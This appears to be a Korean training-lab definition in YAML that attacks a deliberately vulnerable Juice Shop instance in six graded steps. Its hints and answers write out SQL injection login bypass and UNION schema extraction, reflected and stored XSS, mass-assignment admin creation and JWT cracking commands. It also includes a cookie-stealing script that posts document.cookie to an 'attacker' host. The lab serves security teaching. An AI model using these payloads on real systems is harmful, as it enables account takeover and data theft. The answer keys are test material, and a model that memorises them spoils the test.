lab_id: attack-nonai-week04
title: 웹 애플리케이션 공격 (Web App Attacks)
version: non-ai
course: attack-nonai
week: 4
description: SQL Injection, XSS, Command Injection 등 주요 웹 공격 기법을 JuiceShop 환경에서 실습한다.
  OWASP Top 10 취약점을 직접 공략하고, 공격 원리와 대응 방안을 학습한다.
difficulty: medium
duration_minutes: 120
objectives:
- SQL Injection의 원리를 이해하고 다양한 기법(Union, Blind, Error-based)을 실습한다
- XSS(Reflected, Stored, DOM-based)를 실행하고 위험성을 파악한다
- 웹 공격의 대응 방안(입력 검증, WAF, CSP)을 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 '
    OR 1=1-- 페이로드를 사용하여 관리자로 로그인하라.
  hint: |
    POST 요청의 email 필드에 SQL Injection 페이로드를 넣는다.

    📎 도구 우선순위 (힌트):
    1) 우선 사용: curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{"email":"'"'"' OR 1=1--","password":"a"}' | python3 -m json.tool
    2) 미설치 시: sudo apt install -y curl python3
    3) 실패/대안 (SQLi 자동화):
       - sqlmap -u "http://10.20.30.80:3000/rest/user/login" --data='{"email":"x","password":"y"}' --headers="Content-Type: application/json" --batch --level 5 --risk 3 (가장 정밀)
       - sqlmap --dbms sqlite (DB 명시 — JuiceShop 은 SQLite)
       - Burp Repeater + SQLi cheat sheet (수동 페이로드)
       - http POST + httpie (sudo apt install -y httpie)
       - Python requests + json
       - PayloadAllTheThings/SQLi/Auth_Bypass.md (페이로드 모음)
       - Ghauri (modern SQLi automation)
    4) 추가 페이로드: '"' OR 'a'='a"' / "admin'--" / "' UNION SELECT NULL--".
    5) 검증: token 키 (JWT 반환) → 인증 우회 성공. CWE-89 + OWASP A03.
  category: exploit
  points: 10
  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
    \ -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json'\
    \ \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\n | python3 -m json.tool"
  answer_detail: ''' OR 1=1-- 페이로드는 SQL WHERE 절을 항상 참으로 만들어 인증을 우회한다. --는 SQL 주석으로
    이후 조건을 무시시킨다. DB의 첫 번째 사용자(보통 admin)로 로그인된다.'
  verify:
    type: output_contains
    expect: token
    field: stdout
    semantic:
      intent: SQLi 로그인 우회 — curl -X POST /rest/user/login + email=' OR 1=1-- + password=a.
        WHERE 절 항상 참 + 주석으로 뒷부분 무효화 → 첫 사용자(admin) 로그인. OWASP A03 Injection + CWE-89.
      success_criteria:
      - token 키워드 (JWT 반환)
      - email='OR 1=1-- 페이로드
      - POST /rest/user/login
      acceptable_methods:
      - "curl + OR 1=1-- (수기 baseline): JSON body 에 SQLi. token 반환 = 우회 성공."
      - "sqlmap --data + --dbms sqlite: 자동화 + DB 명시."
      - "sqlmap --level 5 --risk 3: 가장 정밀 (false positive 우려)."
      - "Burp Repeater + cheat sheet: 수동 페이로드."
      - "httpie POST: modern."
      - "Python requests: 자동화."
      - "PayloadAllTheThings: 페이로드 모음."
      - "Ghauri: GitHub modern SQLi."
      - "추가 페이로드 시도: admin'-- / ' UNION SELECT NULL-- / ' OR 'a'='a."
      negative_signs:
      - OR 1=1 페이로드 없음
      - 주석(--) 없음
      - 인증 우회 목적 없음
  target_vm: attacker
- order: 2
  instruction: 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인하라.
  hint: |
    JWT는 Base64로 인코딩된 3부분으로 구성된다. python3으로 디코딩할 수 있다.

    📎 도구 우선순위 (힌트):
    1) 우선 사용: python3 -c "import sys,json,base64; t='<JWT>'; p=t.split('.')[1]; p+='='*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))"
    2) 미설치 시: sudo apt install -y python3 (대부분 기본)
    3) 실패/대안 (JWT 디코딩 도구별):
       - jwt.io (web, 시각, 가장 편함)
       - echo "<payload>" | base64 -d (간단, padding 수동)
       - jq -R 'split(".") | .[1] | @base64d | fromjson' (jq, oneline)
       - PyJWT: python3 -c "import jwt; print(jwt.decode('<JWT>', options={'verify_signature': False}))"
       - jwt-cracker (key brute force, GitHub)
       - jwt_tool.py (offline analyzer + attack, GitHub ticarpi/jwt_tool)
       - hashcat -m 16500 jwt.txt wordlist.txt (HMAC key crack)
    4) 후속: header (alg/typ) + payload (exp/iat/sub/role) 분석 → 변조 시도 (alg=none).
    5) 검증: email/role 필드 추출. role:admin 확인.
  category: analysis
  points: 10
  answer: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
    \ application/json' \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\
    \n | python3 -c \"import sys,json,base64; t=json.load(sys.stdin)['authentication']['token'];\
    \ p=t.split('.')[1]; p+='='*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))\""
  answer_detail: JWT(JSON Web Token)는 header.payload.signature 구조이다. payload를 Base64
    디코딩하면 사용자 ID, 이메일, 역할(role) 등의 클레임을 확인할 수 있다. 서명 키가 없으면 변조는 불가능하다.
  verify:
    type: output_contains
    expect: email
    field: stdout
    semantic:
      intent: JWT 토큰 디코딩 — python3 + base64.urlsafe_b64decode(token.split('.')[1]
        + padding). JWT = header.payload.signature + payload 클레임 (id/email/role) 추출.
        서명 키 없이 읽기만 가능.
      success_criteria:
      - email 키워드 (디코딩된 클레임)
      - JWT split '.' + base64 디코딩
      - payload 추출
      acceptable_methods:
      - "python3 base64 (수기 baseline): split('.') + padding + urlsafe_b64decode → email/role."
      - "jwt.io web: 시각, 편함."
      - "echo + base64 -d: 간단."
      - "jq -R split: oneline."
      - "PyJWT decode: verify_signature=False."
      - "jwt_tool.py: offline analyzer + attack."
      - "jwt-cracker: key brute."
      - "hashcat -m 16500: HMAC key crack."
      - "Burp JWT Editor extension: 시각 + 변조 + 서명."
      negative_signs:
      - base64 디코딩 없음
      - JWT 구조 (header.payload.signature) 맥락 없음
      - payload 추출 없음
  target_vm: attacker
- order: 3
  instruction: JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe
    src='javascript:alert(1)'> 페이로드를 사용하라.
  hint: |
    검색 쿼리에 HTML/JavaScript 코드를 삽입한다.

    📎 도구 우선순위 (힌트):
    1) 우선 사용: curl -s 'http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>'
    2) 미설치 시: sudo apt install -y curl
    3) 실패/대안 (XSS 자동화):
       - dalfox url http://10.20.30.80:3000/rest/products/search?q= --silence (Go, fast)
       - xsser -u "http://10.20.30.80:3000/rest/products/search?q=XSS" (legacy)
       - kxss (URL parameter reflection 탐지)
       - Burp Pro Active Scan XSS
       - OWASP ZAP Active Scan XSS
       - PayloadAllTheThings/XSS Injection.md (페이로드 모음)
       - XSS Hunter (외부 callback, payload list)
    4) 페이로드 변형: <script>/<svg onload=>/<img src=x onerror=>/<iframe src=javascript:>/<a href=javascript:>.
    5) URL 인코딩: %3C=< %3E=> %22=" %27=' %20= space.
    6) 검증: 응답에 페이로드 그대로 반영 → CWE-79 + OWASP A03.
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>'''
  answer_detail: Reflected XSS는 사용자 입력이 서버 응답에 그대로 반영될 때 발생한다. 공격자는 악성 스크립트가 포함된 URL을
    피해자에게 전달하여 세션 탈취, 피싱 등을 수행할 수 있다.
  verify:
    type: output_contains
    expect: iframe
    field: stdout
    semantic:
      intent: 'Reflected XSS — curl ''/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>''.
        URL 인코딩 iframe + javascript: URI 스킴. 사용자 입력 반영 → 스크립트 실행. OWASP A03 + CWE-79.
        세션 탈취/피싱 기반.'
      success_criteria:
      - iframe 키워드
      - URL 인코딩 XSS 페이로드 + search?q=
      - 'javascript: URI'
      acceptable_methods:
      - "curl + URL 인코딩 XSS (수기 baseline): %3Ciframe + javascript: URI. 응답 반영 = Reflected XSS."
      - "DalFox: Go fast, 자동 XSS."
      - "XSSer: legacy."
      - "kxss: 반영 탐지."
      - "Burp Pro Active Scan."
      - "OWASP ZAP Active Scan."
      - "PayloadAllTheThings XSS: 페이로드 모음."
      - "XSS Hunter: callback."
      - "DOMPurify bypass DB (XSS payload mutations)."
      negative_signs:
      - iframe/script 페이로드 없음
      - URL 인코딩 없음
      - CWE-79 맥락 없음
  target_vm: attacker
- order: 4
  instruction: JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라.
    Mass Assignment 취약점을 공략하라.
  hint: |
    등록 요청에 role 필드를 추가하여 전송하라.

    📎 도구 우선순위 (힌트):
    1) 우선 사용: curl -s -X POST http://10.20.30.80:3000/api/Users -H 'Content-Type: application/json' -d '{"email":"hacker@test.com","password":"hacker123","passwordRepeat":"hacker123","role":"admin","securityQuestion":{"id":1,"question":"test"},"securityAnswer":"test"}' | python3 -m json.tool
    2) 미설치 시: sudo apt install -y curl python3
    3) 실패/대안:
       - http POST + JSON (httpie)
       - Python requests + json.dumps
       - Burp Repeater + 필드 주입 (수동 추가/제거)
       - Postman + body 조작
       - Arjun (HTTP parameter discovery → 숨겨진 필드 발견)
       - Param Miner (Burp extension)
    4) 추가 필드 시도: isAdmin, is_admin, admin, role:[admin,user], permissions:[*].
    5) 검증: email 필드 + role:admin 응답 → Mass Assignment 성공. CWE-915 + OWASP A01.
  category: exploit
  points: 10
  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
    \ -s -X POST http://10.20.30.80:3000/api/Users \\\n  -H 'Content-Type: application/json'\
    \ \\\n  -d '{\"email\":\"hacker@test.com\",\"password\":\"hacker123\",\"passwordRepeat\"\
    :\"hacker123\",\"role\":\"admin\",\"securityQuestion\":{\"id\":1,\"question\"\
    :\"test\"},\"securityAnswer\":\"test\"}' \\\n | python3 -m json.tool"
  answer_detail: Mass Assignment는 서버가 클라이언트 입력을 검증 없이 객체에 바인딩할 때 발생한다. role 필드를 직접
    지정하여 관리자 권한의 계정을 생성할 수 있다. OWASP A01(Broken Access Control)에 해당한다.
  verify:
    type: output_contains
    expect:
    - email
    - admin
    field: stdout
    semantic:
      intent: Mass Assignment — curl -X POST /api/Users + role:admin 포함 JSON 등록. 서버
        객체 바인딩 미검증 → role 필드 직접 지정 → 관리자 계정 생성. OWASP A01 Broken Access Control +
        CWE-915.
      success_criteria:
      - email 키워드 (등록 성공)
      - role:admin 필드 포함 POST
      - /api/Users 등록
      acceptable_methods:
      - "curl + role:admin (수기 baseline): JSON 등록. role 직접 지정 → 관리자 계정."
      - "httpie POST: modern."
      - "Python requests: 자동화."
      - "Burp Repeater: 수동 + 필드 주입."
      - "Postman: GUI."
      - "Arjun: 파라미터 자동 발견."
      - "Param Miner (Burp extension): 숨겨진 필드 brute."
      - "추가 필드: isAdmin/is_admin/admin/permissions."
      - "Bastion AI Mass Assignment 자동: bastion 이 모든 필드 brute → 권한 상승 finding."
      negative_signs:
      - role:admin 필드 없음
      - Mass Assignment 맥락 없음
      - OWASP A01 맥락 없음
  target_vm: attacker
- order: 5
  instruction: JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을
    시도하여 데이터베이스 테이블 정보를 추출하라.
  hint: |
    UNION SELECT와 sqlite_master를 활용하라.

    📎 도구 우선순위 (힌트):
    1) 우선: curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'
    2) 미설치 시: sudo apt install -y curl
    3) 실패/대안 (UNION SQLi 단계별):
       - sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=" --dbs --tables -T users --columns --dump (자동 dump)
       - sqlmap --technique=U (UNION 만)
       - sqlmap --batch -p q (q 파라미터 명시)
       - 컬럼 개수 fuzz: ' ORDER BY 1-- → 2-- → ... 까지 에러 시 컬럼 수
       - NULL 매칭: ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
       - PayloadAllTheThings/SQLi/PayloadsAllTheThings.md
       - Burp Repeater + 컬럼 fuzz
    4) DB schema: SQLite → sqlite_master. MySQL → information_schema. PostgreSQL → pg_tables.
    5) 검증: SELECT 키워드 + 테이블/컬럼 명 추출.
  category: exploit
  points: 15
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'''
  answer_detail: UNION 기반 SQLi는 원래 쿼리에 UNION SELECT를 추가하여 다른 테이블의 데이터를 함께 출력하는 기법이다.
    sqlite_master(SQLite) 또는 information_schema(MySQL)에서 테이블 구조를 조회할 수 있다.
  verify:
    type: output_contains
    expect: SELECT
    field: stdout
    semantic:
      intent: UNION SQLi — curl '/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'.
        원래 쿼리 + UNION SELECT sqlite_master (SQLite 스키마 테이블) → 테이블 구조 추출. 9개 컬럼 매칭.
      success_criteria:
      - SELECT 키워드
      - UNION SELECT + sqlite_master
      - URL 인코딩 페이로드
      acceptable_methods:
      - "curl + UNION SELECT (수기 baseline): sqlite_master 9 컬럼. 테이블 구조 추출."
      - "sqlmap --technique=U: UNION 만."
      - "sqlmap --dbs --dump: 자동 dump."
      - "ORDER BY 컬럼 fuzz: 개수 추정."
      - "NULL 매칭: 컬럼 일치 확인."
      - "Burp Repeater + 컬럼 fuzz."
      - "PayloadAllTheThings UNION."
      - "Ghauri (modern)."
      - "DB별 schema: SQLite=sqlite_master, MySQL=information_schema, PostgreSQL=pg_tables."
      negative_signs:
      - UNION SELECT 없음
      - sqlite_master 또는 information_schema 맥락 없음
  target_vm: attacker
- order: 6
  instruction: JuiceShop의 고객 피드백(/api/Feedbacks)에 Stored XSS 페이로드를 삽입하라. comment 필드에
    <script>alert('XSS')</script>를 포함하라.
  hint: |
    POST 요청으로 피드백을 제출하며, 관리자 토큰이 필요할 수 있다.

    📎 도구 우선순위 (힌트):
    1) 우선: TOKEN=$(curl ...login...) 후 curl -X POST /api/Feedbacks -H "Authorization: Bearer $TOKEN" -d '{"comment":"<script>alert(1)</script>","rating":1}'
    2) 미설치 시: sudo apt install -y curl python3
    3) 실패/대안:
       - DalFox stored: dalfox url ... -b XSS_Hunter (callback)
       - Burp Repeater + Stored XSS payload
       - PayloadAllTheThings/XSS/Stored.md
       - XSS Hunter (외부 callback, payload 자동 trigger 시 알림)
       - BeEF (Browser Exploitation Framework, hooked 후 module 실행)
       - 자동화: Python requests + token 획득 + POST chain
    4) 페이로드 변형: <script>fetch('http://attacker/c?'+document.cookie)</script> (쿠키 탈취), <svg onload=...>, <img src=x onerror=>.
    5) 검증: comment 필드 + script 페이로드 그대로 저장 → 다른 사용자 (관리자) 페이지 view 시 실행.
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json''
    -H "Authorization: Bearer $TOKEN" -d ''{"comment":"<script>alert(1)</script>","rating":1}''
    | python3 -m json.tool'
  answer_detail: Stored XSS는 악성 스크립트가 서버에 저장되어 다른 사용자가 해당 페이지를 볼 때 실행된다. Reflected
    XSS보다 위험하며, 관리자 페이지에서 실행되면 관리자 세션을 탈취할 수 있다.
  verify:
    type: output_contains
    expect:
    - comment
    - XSS
    field: stdout
